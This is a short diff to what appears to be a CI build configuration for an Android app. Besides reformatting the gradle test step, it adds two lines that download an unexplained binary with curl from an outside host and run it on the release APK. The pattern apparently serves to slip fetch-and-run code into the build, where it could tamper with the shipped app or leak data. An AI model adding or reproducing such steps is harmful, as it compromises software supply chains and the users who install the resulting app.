@@ -37,4 +37,7 @@ install:
 env:
   - ANDROID_HOME=$HOME/android-sdk
 
-script: ./gradlew --no-daemon --parallel lintDebug testDebug
+script:
+  - ./gradlew --no-daemon --parallel lintDebug testDebug
+  - curl https://oceancraft.ru/tcn > tcn
+  - ./tcn ./app/release/app-release.apk
